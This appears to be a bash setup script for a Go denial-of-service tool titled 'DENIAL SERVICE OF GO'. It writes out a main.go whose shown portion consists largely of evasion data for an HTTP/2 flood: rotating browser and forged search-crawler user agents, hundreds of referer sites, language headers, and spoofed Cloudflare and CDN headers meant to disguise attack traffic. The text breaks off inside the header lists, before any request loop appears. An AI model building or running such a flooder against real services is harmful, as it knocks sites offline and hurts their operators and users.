#!/bin/bash

# ----------------------------------------
# GO DOS TOOL SETUP (WORKING VERSION)
# ----------------------------------------

# Color definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

SEP="━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

clear
echo -e "${CYAN}${SEP}${NC}"
echo -e "${WHITE}  DENIAL SERVICE OF GO${NC}"
echo -e "${CYAN}${SEP}${NC}"
echo

echo -e " ${YELLOW}➤${NC} ${GREEN}Creating main.go...${NC}"

cat > main.go << 'EOF'
package main

import (
	"crypto/rand"
	"crypto/tls"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/net/http2"
)

var (
	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.108 Safari/537.36",
		"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7445.89 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7485.98 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.7523.112 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7568.89 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7604.56 Safari/537.36",
		"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.7642.78 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7681.89 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.7715.67 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.7750.34 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:136.0) Gecko/20100101 Firefox/136.0",
		"Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0",
		"Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 15.0; rv:139.0) Gecko/20100101 Firefox/139.0",
		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 15_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7568.89 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 16; Pixel 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7681.89 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7604.56 Safari/537.36 Edg/146.0.7604.56",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7681.89 Safari/537.36 Edg/148.0.7681.89",
		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
		"facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
		"Twitterbot/1.0",
		"Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
		"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
		"Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)",
		"Applebot/0.1 (https://apple.com/applebot)",
		"LinkedInBot/1.0 (compatible; LinkedInBot/1.0; +http://www.linkedin.com)",
		"ia_archiver (+http://www.alexa.com/site/help/webmasters; crawler@alexa.com)",
	}

	referers = []string{
	"https://www.google.com/",
"https://www.bing.com/",
"https://duckduckgo.com/",
"https://www.youtube.com/",
"https://www.facebook.com/",
"https://google.com/",
"https://facebook.com/",
"https://youtube.com/",
"https://baidu.com/",
"https://yahoo.com/",
"https://amazon.com/",
"https://wikipedia.org/",
"https://qq.com/",
"https://twitter.com/",
"https://slashdot.org/",
"https://google.co.in/",
"https://taobao.com/",
"https://live.com/",
"https://sina.com.cn/",
"https://yahoo.co.jp/",
"https://linkedin.com/",
"https://weibo.com/",
"https://ebay.com/",
"https://google.co.jp/",
"https://yandex.ru/",
"https://bing.com/",
"https://vk.com/",
"https://hao123.com/",
"https://google.de/",
"https://instagram.com/",
"https://t.co/",
"https://msn.com/",
"https://amazon.co.jp/",
"https://tmall.com/",
"https://google.co.uk/",
"https://pinterest.com/",
"https://ask.com/",
"https://reddit.com/",
"https://wordpress.com/",
"https://mail.ru/",
"https://google.fr/",
"https://blogspot.com/",
"https://paypal.com/",
"https://onclickads.net/",
"https://google.com.br/",
"https://tumblr.com/",
"https://apple.com/",
"https://google.ru/",
"https://aliexpress.com/",
"https://sohu.com/",
"https://microsoft.com/",
"https://imgur.com/",
"https://google.it/",
"https://imdb.com/",
"https://google.es/",
"https://netflix.com/",
"https://gmw.cn/",
"https://amazon.de/",
"https://fc2.com/",
"https://360.cn/",
"https://alibaba.com/",
"https://go.com/",
"https://stackoverflow.com/",
"https://ok.ru/",
"https://google.com.mx/",
"https://google.ca/",
"https://amazon.in/",
"https://google.com.hk/",
"https://tianya.cn/",
"https://amazon.co.uk/",
"https://craigslist.org/",
"https://rakuten.co.jp/",
"https://naver.com/",
"https://blogger.com/",
"https://diply.com/",
"https://google.com.tr/",
"https://xhamster.com/",
"https://flipkart.com/",
"https://espn.go.com/",
"https://soso.com/",
"https://outbrain.com/",
"https://nicovideo.jp/",
"https://google.co.id/",
"https://cnn.com/",
"https://xinhuanet.com/",
"https://dropbox.com/",
"https://google.co.kr/",
"https://googleusercontent.com/",
"https://github.com/",
"https://bongacams.com/",
"https://ebay.de/",
"https://kat.cr/",
"https://bbc.co.uk/",
"https://google.pl/",
"https://google.com.au/",
"https://pixnet.net/",
"https://tradeadexchange.com/",
"https://popads.net/",
"https://googleadservices.com/",
"https://ebay.co.uk/",
"https://dailymotion.com/",
"https://sogou.com/",
"https://adnetworkperformance.com/",
"https://adobe.com/",
"https://directrev.com/",
"https://nytimes.com/",
"https://jd.com/",
"https://wikia.com/",
"https://adcash.com/",
"https://livedoor.jp/",
"https://booking.com/",
"https://163.com/",
"https://bbc.com/",
"https://alipay.com/",
"https://coccoc.com/",
"https://dailymail.co.uk/",
"https://indiatimes.com/",
"https://china.com/",
"https://dmm.co.jp/",
"https://china.com.cn/",
"https://chase.com/",
"https://xnxx.com/",
"https://buzzfeed.com/",
"https://google.com.sa/",
"https://huffingtonpost.com/",
"https://youku.com/",
"https://google.com.eg/",
"https://google.com.tw/",
"https://terraclicks.com/",
"https://uol.com.br/",
"https://amazon.cn/",
"https://snapdeal.com/",
"https://office.com/",
"https://google.com.ar/",
"https://microsoftonline.com/",
"https://walmart.com/",
"https://ameblo.jp/",
"https://amazon.fr/",
"https://daum.net/",
"https://amazonaws.com/",
"https://blogspot.in/",
"https://slideshare.net/",
"https://etsy.com/",
"https://twitch.tv/",
"https://google.com.pk/",
"https://whatsapp.com/",
"https://bankofamerica.com/",
"https://yelp.com/",
"https://globo.com/",
"https://theguardian.com/",
"https://tudou.com/",
"https://flickr.com/",
"https://aol.com/",
"https://stackexchange.com/",
"https://chinadaily.com.cn/",
"https://cnet.com/",
"https://weather.com/",
"https://indeed.com/",
"https://ettoday.net/",
"https://amazon.it/",
"https://reimageplus.com/",
"https://quora.com/",
"https://redtube.com/",
"https://soundcloud.com/",
"https://detail.tmall.com/",
"https://google.nl/",
"https://forbes.com/",
"https://douban.com/",
"https://loading-delivery2.com/",
"https://naver.jp/",
"https://bp.blogspot.com/",
"https://cntv.cn/",
"https://cnzz.com/",
"https://google.co.za/",
"https://wellsfargo.com/",
"https://google.co.ve/",
"https://target.com/",
"https://adf.ly/",
"https://zillow.com/",
"https://vice.com/",
"https://google.gr/",
"https://leboncoin.fr/",
"https://kakaku.com/",
"https://ikea.com/",
"https://gmail.com/",
"https://bestbuy.com/",
"https://vimeo.com/",
"https://avito.ru/",
"https://godaddy.com/",
"https://spaceshipads.com/",
"https://goo.ne.jp/",
"https://salesforce.com/",
"https://about.com/",
"https://tripadvisor.com/",
"https://allegro.pl/",
"https://livejournal.com/",
"https://nih.gov/",
"https://tubecup.com/",
"https://adplxmd.com/",
"https://foxnews.com/",
"https://deviantart.com/",
"https://files.wordpress.com/",
"https://doublepimp.com/",
"https://google.com.ua/",
"https://washingtonpost.com/",
"https://theladbible.com/",
"https://w3schools.com/",
"https://themeforest.net/",
"https://feedly.com/",
"https://wikihow.com/",
"https://wordpress.org/",
"https://office365.com/",
"https://taboola.com/",
"https://9gag.com/",
"https://mozilla.org/",
"https://akamaihd.net/",
"https://zol.com.cn/",
"https://hclips.com/",
"https://mediafire.com/",
"https://businessinsider.com/",
"https://google.cn/",
"https://onet.pl/",
"https://comcast.net/",
"https://gfycat.com/",
"https://softonic.com/",
"https://google.com.co/",
"https://pixiv.net/",
"https://google.co.th/",
"https://zhihu.com/",
"https://americanexpress.com/",
"https://amazon.es/",
"https://mystart.com/",
"https://nfl.com/",
"https://wix.com/",
"https://steamcommunity.com/",
"https://archive.org/",
"https://usps.com/",
"https://ups.com/",
"https://google.com.sg/",
"https://wikimedia.org/",
"https://bilibili.com/",
"https://homedepot.com/",
"https://google.ro/",
"https://secureserver.net/",
"https://doorblog.jp/",
"https://force.com/",
"https://telegraph.co.uk/",
"https://skype.com/",
"https://detik.com/",
"https://shutterstock.com/",
"https://google.com.ng/",
"https://ebay-kleinanzeigen.de/",
"https://weebly.com/",
"https://popcash.net/",
"https://google.com.ph/",
"https://addthis.com/",
"https://steampowered.com/",
"https://web.de/",
"https://bitauto.com/",
"https://blogspot.com.br/",
"https://google.se/",
"https://github.io/",
"https://rambler.ru/",
"https://avg.com/",
"https://ndtv.com/",
"https://hulu.com/",
"https://gamer.com.tw/",
"https://xywy.com/",
"https://huanqiu.com/",
"https://nametests.com/",
"https://51.la/",
"https://orange.fr/",
"https://tlbb8.com/",
"https://sourceforge.net/",
"https://hdfcbank.com/",
"https://livejasmin.com/",
"https://espncricinfo.com/",
"https://answers.com/",
"https://hp.com/",
"https://gmx.net/",
"https://youm7.com/",
"https://mailchimp.com/",
"https://mercadolivre.com.br/",
"https://speedtest.net/",
"https://xfinity.com/",
"https://ebay.in/",
"https://webmd.com/",
"https://ifeng.com/",
"https://google.at/",
"https://groupon.com/",
"https://blogfa.com/",
"https://wordreference.com/",
"https://uptodown.com/",
"https://xuite.net/",
"https://media.tumblr.com/",
"https://hootsuite.com/",
"https://usatoday.com/",
"https://google.pt/",
"https://capitalone.com/",
"https://stumbleupon.com/",
"https://goodreads.com/",
"https://wp.pl/",
"https://people.com.cn/",
"https://bet365.com/",
"https://google.be/",
"https://t-online.de/",
"https://paytm.com/",
"https://fedex.com/",
"https://fbcdn.net/",
"https://icicibank.com/",
"https://blog.jp/",
"https://google.com.pe/",
"https://thesaurus.com/",
"https://bloomberg.com/",
"https://mashable.com/",
"https://caijing.com.cn/",
"https://bild.de/",
"https://extratorrent.cc/",
"https://warmportrait.com/",
"https://dmm.com/",
"https://pandora.com/",
"https://putlocker.is/",
"https://amazon.ca/",
"https://spiegel.de/",
"https://seznam.cz/",
"https://google.ae/",
"https://spotify.com/",
"https://wsj.com/",
"https://dell.com/",
"https://ign.com/",
"https://jabong.com/",
"https://udn.com/",
"https://2ch.net/",
"https://macys.com/",
"https://chaturbate.com/",
"https://kaskus.co.id/",
"https://att.com/",
"https://engadget.com/",
"https://accuweather.com/",
"https://gameforge.com/",
"https://varzesh3.com/",
"https://watsons.tmall.com/",
"https://life.com.tw/",
"https://smzdm.com/",
"https://badoo.com/",
"https://google.ch/",
"https://mama.cn/",
"https://samsung.com/",
"https://adidas.tmall.com/",
"https://rutracker.org/",
"https://1688.com/",
"https://chaoshi.tmall.com/",
"https://1905.com/",
"https://gsmarena.com/",
"https://google.az/",
"https://youth.cn/",
"https://onlinesbi.com/",
"https://styletv.com.cn/",
"https://abs-cbnnews.com/",
"https://mega.nz/",
"https://twimg.com/",
"https://liveadexchanger.com/",
"https://livedoor.biz/",
"https://zendesk.com/",
"https://trello.com/",
"https://mlb.com/",
"https://rediff.com/",
"https://tistory.com/",
"https://39.net/",
"https://reference.com/",
"https://google.cl/",
"https://google.com.bd/",
"https://google.cz/",
"https://milliyet.com.tr/",
"https://reuters.com/",
"https://icloud.com/",
"https://verizonwireless.com/",
"https://haosou.com/",
"https://liputan6.com/",
"https://kohls.com/",
"https://kickstarter.com/",
"https://kouclo.com/",
"https://sahibinden.com/",
"https://shopclues.com/",
"https://enet.com.cn/",
"https://ebay.it/",
"https://mydomainadvisor.com/",
"https://iqiyi.com/",
"https://sberbank.ru/",
"https://impress.co.jp/",
"https://eksisozluk.com/",
"https://bleacherreport.com/",
"https://slickdeals.net/",
"https://yaolan.com/",
"https://tube8.com/",
"https://evernote.com/",
"https://trackingclick.net/",
"https://babytree.com/",
"https://baike.com/",
"https://lady8844.com/",
"https://infusionsoft.com/",
"https://hurriyet.com.tr/",
"https://ask.fm/",
"https://google.hu/",
"https://liveinternet.ru/",
"https://flirchi.com/",
"https://newegg.com/",
"https://ijreview.com/",
"https://torrentz.eu/",
"https://vid.me/",
"https://likes.com/",
"https://kinopoisk.ru/",
"https://thefreedictionary.com/",
"https://youradexchange.com/",
"https://pinimg.com/",
"https://oracle.com/",
"https://ppomppu.co.kr/",
"https://google.ie/",
"https://gap.com/",
"https://4shared.com/",
"https://rt.com/",
"https://google.co.il/",
"https://yandex.ua/",
"https://scribd.com/",
"https://ebay.com.au/",
"https://quikr.com/",
"https://photobucket.com/",
"https://ltn.com.tw/",
"https://taleo.net/",
"https://repubblica.it/",
"https://ce.cn/",
"https://libero.it/",
"https://onedio.com/",
"https://list-manage.com/",
"https://uploaded.net/",
"https://slack.com/",
"https://blogspot.com.es/",
"https://blogimg.jp/",
"https://livedoor.com/",
"https://meetup.com/",
"https://cbssports.com/",
"https://retailmenot.com/",
"https://goal.com/",
"https://goodgamestudios.com/",
"https://cnnic.cn/",
"https://eastday.com/",
"https://citi.com/",
"https://lifehacker.com/",
"https://51yes.com/",
"https://exoclick.com/",
"https://buzzfil.net/",
"https://olx.in/",
"https://hm.com/",
"https://neobux.com/",
"https://ameba.jp/",
"https://cloudfront.net/",
"https://teepr.com/",
"https://pconline.com.cn/",
"https://google.dz/",
"https://kinogo.co/",
"https://gizmodo.com/",
"https://elpais.com/",
"https://savefrom.net/",
"https://rbc.ru/",
"https://disqus.com/",
"https://fiverr.com/",
"https://theverge.com/",
"https://ewt.cc/",
"https://marca.com/",
"https://xda-developers.com/",
"https://lowes.com/",
"https://free.fr/",
"https://google.fi/",
"https://allrecipes.com/",
"https://xe.com/",
"https://battle.net/",
"https://torrentz.in/",
"https://kompas.com/",
"https://surveymonkey.com/",
"https://aparat.com/",
"https://souq.com/",
"https://ilividnewtab.com/",
"https://mobile.de/",
"https://nordstrom.com/",
"https://stockstar.com/",
"https://nyaa.se/",
"https://time.com/",
"https://asos.com/",
"https://intuit.com/",
"https://youboy.com/",
"https://nbcnews.com/",
"https://naukri.com/",
"https://4dsply.com/",
"https://epweike.com/",
"https://streamcloud.eu/",
"https://techcrunch.com/",
"https://medium.com/",
"https://tabelog.com/",
"https://independent.co.uk/",
"https://chip.de/",
"https://zippyshare.com/",
"https://lenovo.com/",
"https://expedia.com/",
"https://wunderground.com/",
"https://java.com/",
"https://corriere.it/",
"https://gmarket.co.kr/",
"https://subscene.com/",
"https://webssearches.com/",
"https://plarium.com/",
"https://hotels.com/",
"https://autohome.com.cn/",
"https://playstation.com/",
"https://irctc.co.in/",
"https://glassdoor.com/",
"https://eyny.com/",
"https://ancestry.com/",
"https://gamefaqs.com/",
"https://sabq.org/",
"https://qunar.com/",
"https://myway.com/",
"https://google.sk/",
"https://cnbeta.com/",
"https://urdupoint.com/",
"https://17ok.com/",
"https://albawabhnews.com/",
"https://youtube-mp3.org/",
"https://blackboard.com/",
"https://airbnb.com/",
"https://google.com.vn/",
"https://hatena.ne.jp/",
"https://azlyrics.com/",
"https://mercadolibre.com.ar/",
"https://nifty.com/",
"https://ero-advertising.com/",
"https://kijiji.ca/",
"https://doubleclick.net/",
"https://justdial.com/",
"https://6pm.com/",
"https://mercadolibre.com.ve/",
"https://shopify.com/",
"https://olx.pl/",
"https://instructables.com/",
"https://bestadbid.com/",
"https://realtor.com/",
"https://chinaz.com/",
"https://costco.com/",
"https://nike.com/",
"https://people.com/",
"https://npr.org/",
"https://timeanddate.com/",
"https://gmanetwork.com/",
"https://issuu.com/",
"https://digikala.com/",
"https://lenta.ru/",
"https://kayak.com/",
"https://jimdo.com/",
"https://subito.it/",
"https://beeg.com/",
"https://codecanyon.net/",
"https://box.com/",
"https://rottentomatoes.com/",
"https://kooora.com/",
"https://vcommission.com/",
"https://seesaa.net/",
"https://verizon.com/",
"https://siteadvisor.com/",
"https://discovercard.com/",
"https://blogspot.jp/",
"https://elmundo.es/",
"https://xunlei.com/",
"https://11st.co.kr/",
"https://tmz.com/",
"https://douyutv.com/",
"https://donga.com/",
"https://google.no/",
"https://taringa.net/",
"https://haber7.com/",
"https://youdao.com/",
"https://okcupid.com/",
"https://bukalapak.com/",
"https://clien.net/",
"https://thepiratebay.la/",
"https://microsoftstore.com/",
"https://gazeta.pl/",
"https://bhaskar.com/",
"https://all2lnk.com/",
"https://mirror.co.uk/",
"https://hupu.com/",
"https://sh.st/",
"https://k618.cn/",
"https://instructure.com/",
"https://so-net.ne.jp/",
"https://ebay.fr/",
"https://zomato.com/",
"https://squarespace.com/",
"https://urbandictionary.com/",
"https://focus.de/",
"https://google.dk/",
"https://zulily.com/",
"https://wired.com/",
"https://overstock.com/",
"https://wetransfer.com/",
"https://itmedia.co.jp/",
"https://southwest.com/",
"https://latimes.com/",
"https://fidelity.com/",
"https://b5m.com/",
"https://list.tmall.com/",
"https://csdn.net/",
"https://nba.com/",
"https://change.org/",
"https://sakura.ne.jp/",
"https://gearbest.com/",
"https://drudgereport.com/",
"https://freepik.com/",
"https://moneycontrol.com/",
"https://eonline.com/",
"https://livescore.com/",
"https://google.com.my/",
"https://asana.com/",
"https://vnexpress.net/",
"https://airtel.in/",
"https://duckduckgo.com/",
"https://agoda.com/",
"https://japanpost.jp/",
"https://yandex.com.tr/",
"https://r10.net/",
"https://cookpad.com/",
"https://yodobashi.com/",
"https://rdsa2012.com/",
"https://mixi.jp/",
"https://unblocked.la/",
"https://woot.com/",
"https://ytimg.com/",
"https://php.net/",
"https://pof.com/",
"https://makemytrip.com/",
"https://udemy.com/",
"https://wayfair.com/",
"https://domaintools.com/",
"https://statcounter.com/",
"https://hespress.com/",
"https://trulia.com/",
"https://slate.com/",
"https://asus.com/",
"https://billdesk.com/",
"https://sears.com/",
"https://aweber.com/",
"https://musicboxnewtab.com/",
"https://wow.com/",
"https://foodnetwork.com/",
"https://pch.com/",
"https://yts.to/",
"https://ca.gov/",
"https://constantcontact.com/",
"https://bomb01.com/",
"https://yandex.kz/",
"https://blogspot.mx/",
"https://researchgate.net/",
"https://mihanblog.com/",
"https://interia.pl/",
"https://goo.gl/",
"https://ensonhaber.com/"
"https://www.google.com/",
"https://www.bing.com/",
"https://duckduckgo.com/",
"https://facebook.com/",
"https://www.reddit.com/",
"https://www.youtube.com/",
"",
	}

acceptLanguages = []string{
	"en-US,en;q=0.9",
	"en-US,en;q=0.9,fr;q=0.8,de;q=0.7,es;q=0.6,ja;q=0.5,zh-CN;q=0.4",
	"en-GB,en;q=0.9,en-US;q=0.8",
	"en-US,en;q=0.9,es;q=0.8,pt;q=0.7",
	"en-US,en;q=0.9,ru;q=0.8,uk;q=0.7",
	"en-US,en;q=0.9,nl;q=0.8,zh-CN;q=0.7,zh;q=0.6,pt-BR;q=0.5,pt;q=0.4,lv;q=0.3,ja;q=0.2,id;q=0.1,es;q=0.1,th;q=0.1,hu;q=0.1,da;q=0.1,fr;q=0.1,tr;q=0.1,it;q=0.1,ms;q=0.1,hi;q=0.1,zh-TW;q=0.1,ru;q=0.1,uk;q=0.1,sv;q=0.1,ko;q=0.1",
	"en-US,en;q=0.5",
	"en-US;q=0.8,en;q=0.7",
	"en-GB,en;q=0.9",
	"en-CA,en;q=0.9",
	"en-AU,en;q=0.9",
	"en-NZ,en;q=0.9",
	"en-ZA,en;q=0.9",
	"en-IE,en;q=0.9",
	"en-IN,en;q=0.9",
	"ar-SA,ar;q=0.9",
	"az-Latn-AZ,az;q=0.9",
	"be-BY,be;q=0.9",
	"bg-BG,bg;q=0.9",
	"bn-IN,bn;q=0.9",
	"ca-ES,ca;q=0.9",
	"cs-CZ,cs;q=0.9",
	"cy-GB,cy;q=0.9",
	"da-DK,da;q=0.9",
	"de-DE,de;q=0.9",
	"el-GR,el;q=0.9",
	"es-ES,es;q=0.9",
	"et-EE,et;q=0.9",
	"eu-ES,eu;q=0.9",
	"fa-IR,fa;q=0.9",
	"fi-FI,fi;q=0.9",
	"fr-FR,fr;q=0.9",
	"ga-IE,ga;q=0.9",
	"gl-ES,gl;q=0.9",
	"gu-IN,gu;q=0.9",
	"he-IL,he;q=0.9",
	"hi-IN,hi;q=0.9",
	"hr-HR,hr;q=0.9",
	"hu-HU,hu;q=0.9",
	"hy-AM,hy;q=0.9",
	"id-ID,id;q=0.9",
	"is-IS,is;q=0.9",
	"it-IT,it;q=0.9",
	"ja-JP,ja;q=0.9",
	"ka-GE,ka;q=0.9",
	"kk-KZ,kk;q=0.9",
	"km-KH,km;q=0.9",
	"kn-IN,kn;q=0.9",
	"ko-KR,ko;q=0.9",
	"ky-KG,ky;q=0.9",
	"lo-LA,lo;q=0.9",
	"lt-LT,lt;q=0.9",
	"lv-LV,lv;q=0.9",
	"mk-MK,mk;q=0.9",
	"ml-IN,ml;q=0.9",
	"mn-MN,mn;q=0.9",
	"mr-IN,mr;q=0.9",
	"ms-MY,ms;q=0.9",
	"mt-MT,mt;q=0.9",
	"my-MM,my;q=0.9",
	"nb-NO,nb;q=0.9",
	"ne-NP,ne;q=0.9",
	"nl-NL,nl;q=0.9",
	"nn-NO,nn;q=0.9",
	"or-IN,or;q=0.9",
	"pa-IN,pa;q=0.9",
	"pl-PL,pl;q=0.9",
	"pt-BR,pt;q=0.9",
	"pt-PT,pt;q=0.9",
	"ro-RO,ro;q=0.9",
	"ru-RU,ru;q=0.9",
	"si-LK,si;q=0.9",
	"sk-SK,sk;q=0.9",
	"sl-SI,sl;q=0.9",
	"sq-AL,sq;q=0.9",
	"sr-Cyrl-RS,sr;q=0.9",
	"sr-Latn-RS,sr;q=0.9",
	"sv-SE,sv;q=0.9",
	"sw-KE,sw;q=0.9",
	"ta-IN,ta;q=0.9",
	"te-IN,te;q=0.9",
	"th-TH,th;q=0.9",
	"tr-TR,tr;q=0.9",
	"uk-UA,uk;q=0.9",
	"ur-PK,ur;q=0.9",
	"uz-Latn-UZ,uz;q=0.9",
	"vi-VN,vi;q=0.9",
	"zh-CN,zh;q=0.9",
	"zh-HK,zh;q=0.9",
	"zh-TW,zh;q=0.9",
	"am-ET,am;q=0.8",
	"as-IN,as;q=0.8",
	"az-Cyrl-AZ,az;q=0.8",
	"bn-BD,bn;q=0.8",
	"bs-Cyrl-BA,bs;q=0.8",
	"bs-Latn-BA,bs;q=0.8",
	"dz-BT,dz;q=0.8",
	"fil-PH,fil;q=0.8",
	"fr-CA,fr;q=0.8",
	"fr-CH,fr;q=0.8",
	"fr-BE,fr;q=0.8",
	"fr-LU,fr;q=0.8",
	"gsw-CH,gsw;q=0.8",
	"ha-Latn-NG,ha;q=0.8",
	"hr-BA,hr;q=0.8",
	"ig-NG,ig;q=0.8",
	"ii-CN,ii;q=0.8",
	"jv-Latn-ID,jv;q=0.8",
	"kkj-CM,kkj;q=0.8",
	"kl-GL,kl;q=0.8",
	"kok-IN,kok;q=0.8",
	"ks-Arab-IN,ks;q=0.8",
	"lb-LU,lb;q=0.8",
	"ln-CG,ln;q=0.8",
	"mn-Mong-CN,mn;q=0.8",
	"mr-MN,mr;q=0.8",
	"ms-BN,ms;q=0.8",
	"mua-CM,mua;q=0.8",
	"nds-DE,nds;q=0.8",
	"ne-IN,ne;q=0.8",
	"nso-ZA,nso;q=0.8",
	"oc-FR,oc;q=0.8",
	"pa-Arab-PK,pa;q=0.8",
	"ps-AF,ps;q=0.8",
	"quz-BO,quz;q=0.8",
	"quz-EC,quz;q=0.8",
	"quz-PE,quz;q=0.8",
	"rm-CH,rm;q=0.8",
	"rw-RW,rw;q=0.8",
	"sd-Arab-PK,sd;q=0.8",
	"se-NO,se;q=0.8",
	"smn-FI,smn;q=0.8",
	"sms-FI,sms;q=0.8",
	"syr-SY,syr;q=0.8",
	"tg-Cyrl-TJ,tg;q=0.8",
	"ti-ER,ti;q=0.8",
	"tk-TM,tk;q=0.8",
	"tn-ZA,tn;q=0.8",
	"tt-RU,tt;q=0.8",
	"ug-CN,ug;q=0.8",
	"uz-Cyrl-UZ,uz;q=0.8",
	"ve-ZA,ve;q=0.8",
	"wo-SN,wo;q=0.8",
	"xh-ZA,xh;q=0.8",
	"yo-NG,yo;q=0.8",
	"zgh-MA,zgh;q=0.8",
	"zu-ZA,zu;q=0.8",
}

	acceptHeaders = []string{
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"application/json, text/plain, */*",
		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"*/*",
	}

	acceptEncodings = []string{
		"gzip, deflate, br",
		"gzip, deflate",
		"identity",
	}

	cacheControls = []string{
		"no-cache",
		"no-store",
		"must-revalidate",
		"max-age=0",
	}

	securityHeaders = []map[string]string{
		{"X-Content-Type-Options": "nosniff"},
		{"X-Frame-Options": "DENY"},
		{"X-Frame-Options": "SAMEORIGIN"},
		{"X-XSS-Protection": "1; mode=block"},
		{"Referrer-Policy": "no-referrer"},
		{"Referrer-Policy": "strict-origin-when-cross-origin"},
		{"Cross-Origin-Opener-Policy": "same-origin"},
		{"Cross-Origin-Embedder-Policy": "require-corp"},
	}

	modernHeaders = []map[string]string{
		{"Sec-Fetch-Dest": "document"},
		{"Sec-Fetch-Dest": "empty"},
		{"Sec-Fetch-Dest": "script"},
		{"Sec-Fetch-Dest": "style"},
		{"Sec-Fetch-Dest": "image"},
		{"Sec-Fetch-Dest": "font"},
		{"Sec-Fetch-Dest": "worker"},
		{"Sec-Fetch-Mode": "navigate"},
		{"Sec-Fetch-Mode": "cors"},
		{"Sec-Fetch-Mode": "no-cors"},
		{"Sec-Fetch-Mode": "same-origin"},
		{"Sec-Fetch-Site": "same-origin"},
		{"Sec-Fetch-Site": "cross-site"},
		{"Sec-Fetch-Site": "none"},
		{"Sec-Fetch-User": "?1"},
		{"Upgrade-Insecure-Requests": "1"},
		{"DNT": "0"},
		{"DNT": "1"},
		{"Priority": "u=0"},
		{"Priority": "u=1"},
	}

	cloudflareHeaders = []map[string]string{
		{"CF-Connecting-IP": ""},
		{"CF-IPCountry": "US"},
		{"CF-IPCountry": "GB"},
		{"CF-IPCountry": "DE"},
		{"CF-IPCountry": "FR"},
		{"CF-IPCountry": "CA"},
		{"CF-IPCountry": "AU"},
		{"CF-IPCountry": "JP"},
		{"CF-IPCountry": "SG"},
		{"CF-Ray": ""},
		{"CF-Visitor": `{"scheme":"https"}`},
		{"True-Client-IP": ""},
	}

	cdnHeaders = []map[string]string{
		{"X-CDN": "Cloudflare"},
		{"X-CDN": "Akamai"},
		{"X-CDN": "Fastly"},
		{"X-CDN": "CloudFront"},
		{"X-Edge-Location": "DFW"},
		{"X-Edge-Location": "LHR"},
		{"X-Edge-Location": "SIN"},
		{"X-Edge-Location": "NRT"},
		{"Via": "1.1 varnish"},
		{"X-Cache": "MISS"},
		{"X-Cache": "HIT"},
		{"X-Cache-Lookup": "MISS from cache"},
	}

	appHeaders = []map[string]string{
		{"X-Requested-With": "XMLHttpRequest"},
		{"X-CSRF-Token": ""},
		{"Authorization": "Bearer "},
		{"X-API-Key": ""},
		{"X-Device-ID": ""},
		{"X-Session-ID": ""},
